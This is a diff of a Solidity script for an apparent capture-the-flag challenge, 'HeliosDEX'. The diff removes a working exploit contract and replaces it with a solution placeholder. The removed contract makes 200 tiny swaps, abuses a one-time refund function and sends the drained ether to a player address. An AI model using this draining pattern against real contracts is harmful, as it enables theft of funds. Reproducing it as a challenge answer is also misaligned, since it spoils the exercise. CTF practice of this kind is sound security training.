@@ -22,27 +22,11 @@ contract Solve is Script{
         vm.startBroadcast();
         Setup setup=Setup(_setup);
         address player=0x915f794B36Fd328D362445e3BD66ae4f3A894389;
-        HeliosDEX _heliosdex=setup.TARGET();
-        Exploit exploit=new Exploit();
-        exploit.pwn{value:200}(_heliosdex, player);
+        /*
+        Implement your solution from here.
+        */
         require(setup.isSolved(),"Chall Not Solved");
         vm.stopBroadcast();
     }
 }
 
-
-contract Exploit{
-
-    function pwn(HeliosDEX _helios,address _player)public payable{
-        ERC20 _hls;
-        _hls=_helios.heliosLuminaShards();
-        for(uint8 i=0;i<200;i++){
-            _helios.swapForHLS{value: 1}();
-        }
-        _hls.approve(address(_helios),200);
-        _helios.oneTimeRefund(address(_hls), 200);
-        payable(_player).transfer(address(this).balance);
-    }
-
-    receive()external payable{}
-}
